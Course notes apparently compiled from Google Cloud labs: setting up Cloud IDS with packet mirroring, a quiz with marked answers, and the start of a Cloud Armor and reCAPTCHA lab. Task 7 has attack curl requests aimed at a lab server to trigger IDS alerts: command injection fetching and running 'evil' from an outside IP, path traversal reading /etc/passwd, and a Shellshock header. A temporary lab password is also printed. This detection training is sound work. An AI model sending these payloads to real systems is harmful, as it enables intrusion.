+Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.
+
+Google Cloud Shell provides command-line access to your Google Cloud resources.
+
+1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.
+
+   ![Highlighted Cloud Shell icon](images/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png)
+
+2. Click **Continue**.
+
+It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:
+
+![Project ID highlighted in the Cloud Shell Terminal](images/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D.png)
+
+**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.
+
+- You can list the active account name with this command:
+
+```
+gcloud auth list
+```
+
+Copied!
+
+**Output:**
+
+```
+Credentialed accounts:
+ - <myaccount>@<mydomain>.com (active)
+</mydomain></myaccount>
+```
+
+**Example output:**
+
+```
+Credentialed accounts:
+ - google1623327_student@qwiklabs.net
+```
+
+- You can list the project ID with this command:
+
+```
+gcloud config list project
+```
+
+Copied!
+
+**Output:**
+
+```
+[core]
+project = <project_id>
+</project_id>
+```
+
+**Example output:**
+
+```
+[core]
+project = qwiklabs-gcp-44776a13dea667a6
+```
+
+**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).
+
+This lab will all be done using `gcloud` CLI commands inside Cloud Shell.
+
+#### Task 1. Enable APIs
+
+In this task you set the project ID variable and then enable the APIs required for the lab.
+
+1. In Cloud Shell, to set the **Project_ID** environment variable, run the following command:
+
+```
+export PROJECT_ID=$(gcloud config get-value project | sed '2d')
+```
+
+Copied!
+
+1. Enable the Service Networking API:
+
+```
+gcloud services enable servicenetworking.googleapis.com \
+    --project=$PROJECT_ID
+```
+
+Copied!
+
+If prompted to authorize the command, click **Authorize**.
+
+1. Enable the Cloud IDS API:
+
+```
+gcloud services enable ids.googleapis.com \
+    --project=$PROJECT_ID
+```
+
+Copied!
+
+1. Enable the Cloud Logging API:
+
+```
+gcloud services enable logging.googleapis.com \
+    --project=$PROJECT_ID
+```
+
+Copied!
+
+Click *Check my progress* to verify the objective.
+
+Enable APIs.
+
+
+
+Check my progress
+
+
+
+#### Task 2. Build the Google Cloud networking footprint
+
+In this task, you create a Google Cloud VPC network and configure private services access.
+
+Private services access is a private connection between your VPC network and a network owned by Google or a third party. Google or the third party, entities who are offering services, are also known as service producers.
+
+The private connection enables virtual machine (VM) instances in your VPC network and the services that you access to communicate exclusively by using internal IP addresses.
+
+1. In Cloud Shell, to create a VPC, run the following command:
+
+```
+gcloud compute networks create cloud-ids \
+--subnet-mode=custom
+```
+
+Copied!
+
+If prompted to authorize the command, click **Authorize**.
+
+1. Add a subnet to the VPC for mirrored traffic in us-east1:
+
+```
+gcloud compute networks subnets create cloud-ids-useast1 \
+--range=192.168.10.0/24 \
+--network=cloud-ids \
+--region=us-east1
+```
+
+Copied!
+
+1. Configure private services access:
+
+```
+gcloud compute addresses create cloud-ids-ips \
+--global \
+--purpose=VPC_PEERING \
+--addresses=10.10.10.0 \
+--prefix-length=24 \
+--description="Cloud IDS Range" \
+--network=cloud-ids
+```
+
+Copied!
+
+1. Create a private connection:
+
+```
+gcloud services vpc-peerings connect \
+--service=servicenetworking.googleapis.com \
+--ranges=cloud-ids-ips \
+--network=cloud-ids \
+--project=$PROJECT_ID
+```
+
+Copied!
+
+Click *Check my progress* to verify the objective.
+
+Create a VPC.
+
+
+
+Check my progress
+
+
+
+#### Task 3. Create a Cloud IDS endpoint
+
+In this task you create a Cloud IDS endpoint in us-east1 with a severity set to *informational*.
+
+Cloud IDS uses a resource known as an IDS endpoint, a zonal resource that can inspect traffic from any zone in its region. Each IDS endpoint receives mirrored traffic and performs threat detection analysis.
+
+**Note:** The creation of the IDS endpoint takes approximately 20 minutes.
+
+1. To create a Cloud IDS endpoint, in Cloud Shell, run the following command:
+
+```
+gcloud ids endpoints create cloud-ids-east1 \
+--network=cloud-ids \
+--zone=us-east1-b \
+--severity=INFORMATIONAL \
+--async
+```
+
+Copied!
+
+1. Verify that the Cloud IDS endpoint is initiated:
+
+```
+gcloud ids endpoints list --project=$PROJECT_ID
+```
+
+Copied!
+
+If the message **Would you like to enable and retry** appears, press **Y**.
+
+The output should be similar to this:
+
+Command Output
+
+```
+  ID: cloud-ids-east1
+  LOCATION: us-east1-b
+  SEVERITY: INFORMATIONAL
+  STATE: CREATING
+  NETWORK: cloud-ids
+  TRAFFIC_LOGS:
+```
+
+Click *Check my progress* to verify the objective.
+
+Create a Cloud IDS endpoint.
+
+
+
+Check my progress
+
+
+
+#### Task 4. Create Firewall rules and Cloud NAT
+
+In this task you create two firewall rules: allow-http-icmp and allow-iap-proxy.
+
+To enable standard http port (TCP 80) connections, and ICMP protocol connections to the server VM from all sources in the cloud-ids network, you define the *allow-http-icmp* rule.
+
+To enable SSH connections to the VMs from the Identity-Aware Proxy IP range, you define the allow-iap-proxy_ rule.
+
+You also configure Cloud Router and then configure Cloud NAT. As a prerequisite for Cloud NAT, a Cloud Router must first be configured in the same region. To provide internet access to VMs that don't have a public IP address, a Cloud NAT must be created in the same region. The VMs will be created without a public IP address to make sure that they are inaccessible *from* the internet. However, they will need access *to* the internet to download updates and files.
+
+1. To create the allow-http-icmp rule, in Cloud Shell, run the following command:
+
+```
+gcloud compute firewall-rules create allow-http-icmp \
+--direction=INGRESS \
+--priority=1000 \
+--network=cloud-ids \
+--action=ALLOW \
+--rules=tcp:80,icmp \
+--source-ranges=0.0.0.0/0 \
+--target-tags=server
+```
+
+Copied!
+
+1. Create the allow-iap-proxy rule:
+
+```
+gcloud compute firewall-rules create allow-iap-proxy \
+--direction=INGRESS \
+--priority=1000 \
+--network=cloud-ids \
+--action=ALLOW \
+--rules=tcp:22 \
+--source-ranges=35.235.240.0/20
+```
+
+Copied!
+
+Click *Check my progress* to verify the objective.
+
+Add firewall rules to the VPC.
+
+
+
+Check my progress
+
+
+
+1. To create a Cloud Router, run the following command:
+
+```
+gcloud compute routers create cr-cloud-ids-useast1 \
+--region=us-east1 \
+--network=cloud-ids
+```
+
+Copied!
+
+1. To configure a Cloud NAT, run the following command:
+
+```
+gcloud compute routers nats create nat-cloud-ids-useast1 \
+--router=cr-cloud-ids-useast1 \
+--router-region=us-east1 \
+--auto-allocate-nat-external-ips \
+--nat-all-subnet-ip-ranges
+```
+
+Copied!
+
+Click *Check my progress* to verify the objective.
+
+Create a Cloud Router.
+
+
+
+Check my progress
+
+
+
+#### Task 5. Create two virtual machines
+
+In this task, you create two virtual machines (VMs). The first virtual machine is your web server, which is mirroring to Cloud IDS. The second virtual machine is the source of your attack traffic.
+
+You establish an SSH connection to your server via Identity-Aware Proxy (IAP), check the status of your web service server, create a benign malware file on the web server, and then add content to the file.
+
+1. To create a virtual machine to be a server mirroring to Cloud IDS, in Cloud Shell, run the following command:
+
+```
+gcloud compute instances create server \
+--zone=us-east1-b \
+--machine-type=e2-medium \
+--subnet=cloud-ids-useast1 \
+--no-address \
+--private-network-ip=192.168.10.20 \
+--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
+--tags=server \
+--image=debian-11-bullseye-v20240709 \
+--image-project=debian-cloud \
+--boot-disk-size=10GB
+```
+
+Copied!
+
+This command creates a Debian server in us-east1 and installs a simple web service.
+
+1. Create a virtual machine to be a client sending attack traffic:
+
+```
+gcloud compute instances create attacker \
+--zone=us-east1-b \
+--machine-type=e2-medium \
+--subnet=cloud-ids-useast1 \
+--no-address \
+--private-network-ip=192.168.10.10 \
+--image=debian-11-bullseye-v20240709 \
+--image-project=debian-cloud \
+--boot-disk-size=10GB
+```
+
+Copied!
+
+This command prepares a Debian server in us-east1 to use as your client.
+
+Click *Check my progress* to verify the objective.
+
+Create a virtual machine.
+
+
+
+Check my progress
+
+
+
+##### Prepare your server
+
+In this procedure, you validate your server and then create a benign malware payload for your client.
+
+1. To establish an SSH connection to your server via IAP, run the following command:
+
+```
+gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap
+```
+
+Copied!
+
+This command will prompt you through a series of steps to create an ssh key and the required directories.
+
+1. To agree to the directory creation prompt, type **Y**.
+2. When prompted for a passphrase, to use a blank passphrase, press ENTER twice.
+
+You are now in the shell of your server VM.
+
+##### Confirm that the web service is running
+
+In this procedure, you check the status of your web service server. You create a benign malware file on the web server and then add content to the file.
+
+1. To check the status of your web service, run the following Linux command:
+
+```
+sudo systemctl status nginx
+```
+
+Copied!
+
+The output should be similar to this:
+
+Command Output
+
+```
+ ● nginx.service - A high performance web server and a reverse proxy server
+   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)
+   Active: active (running) since Tue 2021-05-25 18:01:49 UTC; 5h 24 min ago
+   Docs: man:nginx(8)
+   Main PID: 1347 (nginx)
+   Tasks: 3 (limit: 4665)
+   Memory: 4.5M
+   CGroup: /system.slice/nginx.service
+           ├─1347 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+           ├─1348 nginx: worker process
+           └─1349 nginx: worker process
+
+   May 25 18:01:49 server systemd[1]: Starting A high performance web server and a reverse proxy server...
+   May 25 18:01:49 server systemd[1]: Started A high performance web server and a reverse proxy server.                       
+```
+
+1. Change directory to the web service:
+
+```
+cd /var/www/html/
+```
+
+Copied!
+
+1. Create a benign malware file on the web server. Run the following Linux command to create a text file:
+
+```
+sudo touch eicar.file
+```
+
+Copied!
+
+1. Add the following content to the newly created file:
+
+```
+echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file
+```
+
+Copied!
+
+1. Exit the server VM shell and return to Cloud Shell:
+
+```
+exit
+```
+
+Copied!
+
+#### Task 6. Create a Cloud IDS packet mirroring policy
+
+In this task, you create a Cloud IDS packet mirroring policy. This policy determines what traffic is mirrored to the Cloud IDS. You will then attach this policy to the newly created Cloud IDS endpoint.
+
+As mentioned earlier, the Cloud IDS endpoint creation takes some time. Before you can proceed with this lab, the endpoint must be in an active/ready state.
+
+1.To verify that your Cloud IDS endpoint is active, in Cloud Shell, run the following command to show the current state of the Cloud IDS endpoint:
+
+```
+gcloud ids endpoints list --project=$PROJECT_ID | grep STATE
+```
+
+Copied!
+
+The output should be similar to this:
+
+Command Output
+
+```
+  STATE: READY
+```
+
+Continue to run this command every few minutes until the state shows *READY*.
+
+1. Identify the Cloud IDS endpoint forwarding rule and confirm that the Cloud IDS endpoint state is *READY*:
+
+```
+export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
+echo $FORWARDING_RULE
+```
+
+Copied!
+
+The output should be similar to this:
+
+Command Output
+
+```
+  https://www.googleapis.com/compute/v1/projects/md975a7fa0a53145dp-tp/regions/us-east1/forwardingRules/ids-fr-cloud--xkkerutlagop6opm                         
+```
+
+
+
+1. Create and attach the packet mirroring policy:
+
+```
+gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
+--region=us-east1 \
+--collector-ilb=$FORWARDING_RULE \
+--network=cloud-ids \
+--mirrored-subnets=cloud-ids-useast1
+```
+
+Copied!
+
+Click *Check my progress* to verify the objective.
+
+Create and attach the packet mirroring policy.
+
+
+
+Check my progress
+
+
+
+1. Verify that the packet mirroring policy is created:
+
+```
+gcloud compute packet-mirrorings list
+```
+
+Copied!
+
+This gcloud command lists the packet mirroring policies and shows whether they are enabled/disabled.
+
+The output should be similar to this:
+
+Command Output
+
+```
+  NAME: cloud-ids-packet-mirroring
+  REGION: us-east1
+  NETWORK: cloud-ids
+  ENABLE: TRUE                        
+```
+
+#### Task 7. Simulate attack traffic
+
+In this task, you establish an SSH connection to your attacked virtual machine and simulate attack traffic from a virtual machine to your server. You do this by running a selection of `curl` commands that range from low severity to critical severity.
+
+1. To establish an SSH connection to your attacker virtual machine through IAP, in Cloud Shell, run the following command:
+
+```
+gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap
+```
+
+Copied!
+
+**Note:** You are now in the shell of your attacker VM and not the Cloud Shell machine.
+
+1. Run the following `curl` requests in sequence to simulate low, medium, high, and critical severity alerts on the IDS:
+
+**Low Severity:**
+
+```
+curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
+```
+
+Copied!
+
+**Medium Severity:**
+
+```
+curl http://192.168.10.20/?item=../../../../WINNT/win.ini
+curl http://192.168.10.20/eicar.file
+```
+
+Copied!
+
+**High Severity:**
+
+```
+curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
+```
+
+Copied!
+
+**Critical Severity:**
+
+```
+curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
+```
+
+Copied!
+
+1. Exit the attacker virtual machine shell and return to Cloud Shell:
+
+```
+exit
+```
+
+Copied!
+
+#### Task 8. Review threats detected by Cloud IDS
+
+In this task, you review the various attack traffic captured by the Cloud IDS in the Cloud console. The captured attack traffic profiles provide details of each threat.
+
+1. In the Google Cloud console, in the **Navigation menu** (![Navigation menu](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Network Security > Cloud IDS**.
+2. Click the **Threats** tab.
+
+The Cloud IDS captured various attack traffic profiles and provided the details on each threat. You may need to click **Refresh** if you do not see any threats. You now dive a little deeper and view threat details.
+
+1. Locate the **Bash Remote Code Execution Vulnerability** threat, click **More** (![More Button](https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D)), and then select **View threat details**.
+
+**Note:** You may have noticed that there are multiple threats that produce the same name, for example, “Bash Remote Code Execution Vulnerability”. This is expected behavior.
+
+
+
+If you look closely, you will see that the session IDs of the threats are different. Since both VMs created are in the same subnet, we are seeing mirrored packets for both the client and server. Outbound packets from the client are being mirrored to IDS, and additionally, inbound packets to the server are being mirrored to IDS.
+
+1. Now you view the details of this incident in Cloud Logging. To return to the **Threats** page, click the left arrow.
+2. Click the **Threats** tab.
+3. Locate the **Bash Remote Code Execution Vulnerability**, click **More**, and then select **View threat logs**.
+
+A new Cloud Logging tab opens that displays the same details. This enables you to send the logs to Cloud Storage, Chronicle, or any SIEM/SOAR. You can also create custom workflows to take remediation action based on alerts, like creating a Cloud Function that triggers on an alert and creating or updating a firewall rule to block the IP address, or creating or updating a Google Cloud Armor policy.
+
+Click *Check my progress* to verify the objective.
+
+Getting Started with Cloud IDS.
+
+
+
+Check my progress
+
+
+
+#### Congratulations!
+
+In this lab, you did the following:
+
+1. Created a new VPC and deployed a Cloud IDS endpoint.
+2. Deployed two VMs, created a packet mirroring policy, and then sent attack traffic.
+3. Verified that the Cloud IDS captured the threats by viewing the threat details in the Cloud console and the threat logs in Cloud Logging.
+
+### Quiz
+
+
+
+1. Which ONE of the following statements is TRUE when discussing the SSL capabilities of Google Cloud Load Balancer?
+
+- **The Google-managed profile, COMPATIBLE, allows clients which support out-of-date SSL features.**
+- You must use one of the 3 pre-configured “Google-managed profiles” to specify the level of compatibility appropriate for your application.
+- Google Cloud Load Balancers require, and will only accept, a Google-managed SSL Cert.
+- If no SSL policy is set, the SSL policy is automatically set to the most constrained policy, which is RESTRICTED.
+
+Correct! The other two profiles, MODERN and RESTRICTED allow you to restrict SSL usage to clients with modern capabilities, or to restrict SSL access even further to meet compliance requirements.
+
+2. Which FOUR of the following are firewall rule parameters?
+
+- Timestamp
+
+- **Direction**
+
+- **Source**
+
+- **Action**
+
+- **IP Address**
+
+- Organization
+
+- Project
+
+  
+
+3. Which statement about VPC Service Controls is false?
+
+- VPC Service Controls protect resources within a perimeter so they can only be privately accessed from clients within authorized VPC networks.
+- VPC Service Controls restrict Internet access to resources within a perimeter using allowlisted IPv4 and IPv6 ranges.
+- VPC Service Controls prevent data from being copied to unauthorized resources outside the perimeter using service operations.
+- **VPC Service Controls restrict Internet access to resources within a perimeter by checking permissions assigned to Cloud Identity and Active Directory accounts only.**
+
+Correct! Perimeters are checked against allowlisted IPv4 or IPv6 ranges, not against accounts.
+
+4. Which TWO of the following statements about VPCs is TRUE?
+
+- Google Cloud Firewall allows rules by default only affect traffic flowing in one direction.
+
+- A connection is considered active if it has at least one packet sent over a one hour period.
+
+- **VPC firewall rules in Google Cloud are global in scope.**
+
+  Correct! Since VPC networks can be global in Google Cloud, firewall rules are also global.
+
+- **Every VPC network functions as a distributed firewall where firewall rules are defined at the network level.**
+
+  Correct! Google Cloud firewall rules exist not only between your instances and other networks, but also between individual instances within the same network.
+
+
+
+# 10 Security Best Practices in Google Cloud
+
+
+
+
+
+
+
+
+
+
+
+# Securing your Network with Cloud Armor
+
+## LAB - Bot Management with Google Cloud Armor and reCAPTCHA
+
+### Overview
+
+Google Cloud HTTP(S) load balancing is deployed at the edge of Google's network in Google points of presence (POP) around the world. User traffic directed to an HTTP(S) load balancer enters the POP closest to the user and is then load balanced over Google's global network to the closest backend that has sufficient capacity available.
+
+Cloud Armor is Google's distributed denial of service and web application firewall (WAF) detection system. Cloud Armor is tightly coupled with the Google Cloud HTTP Load Balancer and safeguards applications of Google Cloud customers from attacks from the internet.
+
+[reCAPTCHA Enterprise](https://cloud.google.com/recaptcha-enterprise/docs) is a service that builds on the reCAPTCHA API and protects your site from spam and abuse using advanced risk analysis techniques to tell humans and bots apart. Cloud Armor Bot Management provides an end-to-end solution integrating reCAPTCHA Enterprise bot detection and scoring with enforcement by Cloud Armor at the edge of the network to protect downstream applications.
+
+In this lab, you configure an HTTP Load Balancer with a backend, as shown in the diagram below. You set up a reCAPTCHA session token site key and embed it in your website. You also set up redirection to reCAPTCHA Enterprise manual challenge. You then configure a Cloud Armor bot management policy to see how bot detection protects your application from malicious bot traffic.
+
+![HTTP Load Balancer configuration diagram](images/2kXQgNWkDCt0e9E84gvWp1ZIZrQg5kdhgkF2uWghtlI%3D.png)
+
+### What you'll learn
+
+In this lab, you learn how to:
+
+- Set up a HTTP Load Balancer with appropriate health checks
+- Create a reCAPTCHA WAF challenge-page site key and associated it with Cloud Armor security policy
+- Create a reCAPTCHA session token site key and install it on your web pages
+- Create a Cloud Armor bot management policy
+- Validate that the bot management policy is handling traffic based on the rules configured
+
+### Setup and requirements
+
+### Before you click the Start Lab button
+
+Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources are made available to you.
+
+This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.
+
+To complete this lab, you need:
+
+- Access to a standard internet browser (Chrome browser recommended).
+
+**Note:** Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.
+
+- Time to complete the lab—remember, once you start, you cannot pause a lab.
+
+**Note:** Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.
+
+### How to start your lab and sign in to the Google Cloud console
+
+1. Click the **Start Lab** button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:
+
+   - The Open Google Cloud console button
+   - Time remaining
+   - The temporary credentials that you must use for this lab
+   - Other information, if needed, to step through this lab
+
+2. Click **Open Google Cloud console** (or right-click and select **Open Link in Incognito Window** if you are running the Chrome browser).
+
+   The lab spins up resources, and then opens another tab that shows the Sign in page.
+
+   ***Tip:\*** Arrange the tabs in separate windows, side-by-side.
+
+   **Note:** If you see the **Choose an account** dialog, click **Use Another Account**.
+
+3. If necessary, copy the **Username** below and paste it into the **Sign in** dialog.
+
+   ```
+   student-02-21eef573fe2f@qwiklabs.net
+   ```
+
+   Copied!
+
+   You can also find the Username in the Lab Details pane.
+
+4. Click **Next**.
+
+5. Copy the **Password** below and paste it into the **Welcome** dialog.
+
+   ```
+   FIduoI7qcGGe
+   ```
+
+   Copied!
+
+   You can also find the Password in the Lab Details pane.
+
+6. Click **Next**.
+
+   **Important:** You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.
+
+   **Note:** Using your own Google Cloud account for this lab may incur extra charges.
+
+7. Click through the subsequent pages:
+
+   - Accept the terms and conditions.
+   - Do not add recovery options or two-factor authentication (because this is a temporary account).
+   - Do not sign up for free trials.
+
+After a few moments, the Google Cloud console opens in this tab.
+
+**Note:** To access Google Cloud products and services, click the **Navigation menu** or type the service or product name in the **Search** field. ![Navigation menu icon and Search field](images/9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D.png)
+
+### Before you begin
+
+- In Cloud Shell, set up your project ID:
+
+```
+export PROJECT_ID=$(gcloud config get-value project)
+echo $PROJECT_ID
+gcloud config set project $PROJECT_ID
+```
+
+Copied!
+
+### Enable APIs
+
+- Enable all necessary services:
+
+```
+gcloud services enable compute.googleapis.com
+gcloud services enable logging.googleapis.com
+gcloud services enable monitoring.googleapis.com
+gcloud services enable recaptchaenterprise.googleapis.com
+```
+
+Copied!
+
+You're now set up to begin the first task.
+
+### Task 1. Configure firewall rules to allow HTTP and SSH traffic to backends
+
+For this lab, you use the ***default\*** VPC network created in your project when the lab spun up.
+
+In this section, you configure firewall rules to allow HTTP traffic to the backends from the Google Cloud health checks and the Load Balancer. You then configure a firewall rule to allow SSH into the instances.
+
+##### Create a firewall rule to allow HTTP traffic to the backends.
+
+Health checks determine which instances of a load balancer can receive new connections. For HTTP load balancing, the health check probes to your load balanced instances come from addresses in the ranges **130.211.0.0/22 and 35.191.0.0/16**. Your VPC firewall rules must allow these connections. Also, the load balancers talk to the backend on the same IP range.
+
+To create a firewall rule to allow HTTP traffic to the backends:
+
+1. In the console, navigate to **Navigation menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > VPC network > Firewall**.
+2. Notice the existing **ICMP**, **internal**, **RDP**, and **SSH** firewall rules. Each Google Cloud project starts with the default network and these firewall rules.
+3. Click **Create Firewall Rule**.
+4. Set the following values, leave all other values at their defaults:
+
+| Property                | Value (type value or select option as specified)             |
+| :---------------------- | :----------------------------------------------------------- |
+| **Name**                | default-allow-health-check                                   |
+| **Network**             | default                                                      |
+| **Targets**             | Specified target tags                                        |
+| **Target tags**         | allow-health-check                                           |
+| **Source filter**       | IPv4 Ranges                                                  |
+| **Source IPv4 ranges**  | 130.211.0.0/22, 35.191.0.0/16                                |
+| **Protocols and ports** | Specified protocols and ports, and then check `tcp`. Type `80` for the port number |
+
+**Note:** Be sure to enter the two **Source IPv4 ranges** one-by-one and press SPACE in between them.
+
+1. Click **Create**.
+
+Alternatively, in the gCloud command line, use the following command:
+
+```
+gcloud compute firewall-rules create default-allow-health-check --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:80 --source-ranges=130.211.0.0/22,35.191.0.0/16 --target-tags=allow-health-check
+```
+
+Copied!
+
+1. Similarly, create a firewall rule to allow SSH-ing into the instances:
+
+```
+gcloud compute firewall-rules create allow-ssh --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:22 --source-ranges=0.0.0.0/0 --target-tags=allow-health-check
+```
+
+Copied!
+
+Click **Check my progress** to verify the objective.
+
+Configure firewall rules to allow HTTP and SSH traffic to backends
+
+
+
+Check my progress
+
+
+
+### Task 2. Configure instance templates and create managed instance groups
+
+A managed instance group uses an instance template to create a group of identical instances. Use these to create the backend of the HTTP Load Balancer.
+
+#### Configure the instance templates
+
+An instance template is a resource that you use to create VM instances and managed instance groups. Instance templates define the machine type, boot disk image, subnet, labels, and other instance properties.
+
+To create an instance template:
+
+1. In the console, navigate to **Navigation menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > Compute Engine > Instance templates**, and then click **Create instance template**.
+2. For **Name**, type **lb-backend-template**.
+3. For **Location**, Select **Global**.
+4. For Series, select **N1**.
+5. Click **Networking, Disks, Security, Management, Sole-Tenancy** under **Advanced options**.
+6. Go to the **Management** section and insert the following script into the **Startup script** field:
+
+```
+#! /bin/bash
+sudo apt-get update
+sudo apt-get install apache2 -y
+sudo a2ensite default-ssl
+sudo a2enmod ssl
+sudo su
+vm_hostname="$(curl -H "Metadata-Flavor:Google" \
+http://metadata.google.internal/computeMetadata/v1/instance/name)"
+echo "Page served from: $vm_hostname" | \
+tee /var/www/html/index.html
+```
+
+Copied!
+
+1. Click on the **Networking** tab and add the network tag: **allow-health-check**
+2. Set the following values and leave all other values at their defaults:
+
+| Property                                  | Value (type value or select option as specified) |
+| :---------------------------------------- | :----------------------------------------------- |
+| **Network (Under Network Interfaces)**    | default                                          |
+| **Subnetwork (Under Network Interfaces)** | default (`us-central1`)                          |
+| **Network tags**                          | allow-health-check                               |
+
+**Note:** The network tag **allow-health-check** ensures that the HTTP Health Check and SSH firewall rules apply to these instances.
+
+1. Click **Create**.
+
+Wait for the instance template to be created.
+
+#### Create the managed instance group
+
+To Create the managed instance group:
+
+1. Still in **Compute Engine** page, click **Instance groups** in the left pane.
+2. Click **Create instance group**.
+3. Select **New managed instance group (stateless)**.
+4. Set the following values, leave all other values at their defaults:
+
+| Property                       | Value (type value or select option as specified)      |
+| :----------------------------- | :---------------------------------------------------- |
+| **Name**                       | lb-backend-example                                    |
+| **Location**                   | Single zone                                           |
+| **Region**                     | `us-central1`                                         |
+| **Zone**                       | `us-central1-c`                                       |
+| **Instance template**          | lb-backend-template                                   |
+| **Autoscaling**                | Set **Autoscaling mode** to **Off: do not autoscale** |
+| **Minimum number of instance** | 1                                                     |
+
+1. Click **Create**.
+
+#### Add a named port to the instance group
+
+- For your instance group, in Cloud Shell, define an HTTP service and map a port name to the relevant port:
+
+```
+gcloud compute instance-groups set-named-ports lb-backend-example \
+--named-ports http:80 \
+--zone <var>us-central1-c</var>
+```
+
+Copied!
+
+The load balancing service forwards traffic to the named port.
+
+Click **Check my progress** to verify the objective.
+
+Configure instance templates and create managed instance groups
+
+
+
+Check my progress
+
+
+
+### Task 3. Configure the HTTP Load Balancer
+
+In this section, you configure the HTTP Load Balancer to send traffic to your backend **lb-backend-example**.
+
+#### Start the configuration
+
+1. In the console, click **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > click **Network Services** > **Load balancing**, and then click **Create load balancer**.
+2. Select **Application Load Balancer (HTTP/HTTPS)** and **Next**.
+3. Select **Public facing (external)** and **Next**.
+4. Select **Best for global workloads** and **Next**.
+5. Select **Global external Application Load Balancer** and **Next**.
+6. Select **Configure**.
+7. Set the **Name** to `http-lb`.
+
+#### Configure the frontend
+
+1. Click **Frontend configuration**.
+2. Specify the following, leaving all other values at their defaults:
+
+| Property       | Value (type value or select option as specified) |
+| :------------- | :----------------------------------------------- |
+| **Protocol**   | HTTP                                             |
+| **IP version** | IPv4                                             |
+| **IP address** | Ephemeral                                        |
+| **Port**       | 80                                               |
+
+1. Click **Done**.
+
+#### Configure the backend
+
+Backend services direct incoming traffic to one or more attached backends. Each backend is composed of an instance group and additional serving capacity metadata.
+
+1. Click on **Backend configuration**.
+2. For **Backend services & backend buckets**, click **Create a backend service**.
+3. Set the following values, leave all other values at their defaults:
+
+| Property           | Value (select option as specified) |
+| :----------------- | :--------------------------------- |
+| **Name**           | http-backend                       |
+| **Protocol**       | HTTP                               |
+| **Named Port**     | http                               |
+| **Instance group** | lb-backend-example                 |
+| **Port numbers**   | 80                                 |
+
+1. Click **Done**.
+2. For **Cloud CDN**, set the **Cache mode** to **Use origin settings based on Cache-Control headers**.
+3. For **Health Check**, select **Create a health check**.
+
+![Create a health check button](images/v4LmFGAsRY27SSVBpF1v9LLdLhQ%2Bx5Nt%2BQpczoRw%2Fxw%3D.png)
+
+1. Set the following values, leave all other values at their defaults:
+
+| Property     | Value (select option as specified) |
+| :----------- | :--------------------------------- |
+| **Name**     | http-health-check                  |
+| **Protocol** | TCP                                |
+| **Port**     | 80                                 |
+
+**Note:** Health checks determine which instances receive new connections.
+
+
+
+This HTTP health check polls instances every 5 seconds, waits up to 5 seconds for a response and treats 2 successful or 2 failed attempts as healthy or unhealthy, respectively.
+
+1. Click **Save**.
+2. Check the **Enable Logging box**.
+3. Set the **Sample rate** to `1`.
+4. Click **Create** to create the backend service and click **ok**.
+
+#### Review and create the HTTP Load Balancer
+
+Host and path rules determine how your traffic is directed. For example, you could direct video traffic to one backend and static traffic to another backend. However, you are not configuring the Host and path rules in this lab.
+
+1. Click on **Review and finalize**.
+
+![Load Balancer review and finalize page, which includes information in several categories, such as host and path rules, and backend services](images/RIqOpdDekxI950rGFYHSrRKhl%2BIDRxI%2FsJawQuvSLU8%3D.png)
+
+1. Review the **Backend services** and **Frontend**.
+2. Click on **Create**.
+
+Wait for the load balancer to be created.
+
+1. Click on the name of the load balancer (**http-lb**).
+2. Note the IPv4 address of the load balancer for the next task. In this lab, refer to it as `[LB_IP_v4]`.
+
+Click **Check my progress** to verify the objective.
+
+Configure the HTTP Load Balancer
+
+
+
+Check my progress
+
+
+
+#### Test the HTTP Load Balancer
+
+Now that you created the HTTP Load Balancer for your backends, verify that traffic is forwarded to the backend service.
+
+- To test IPv4 access to the HTTP Load Balancer, open a new tab in your browser and navigate to **http://[LB_IP_v4]**. Be sure to replace `[LB_IP_v4]` with the IPv4 address of the load balancer.
+
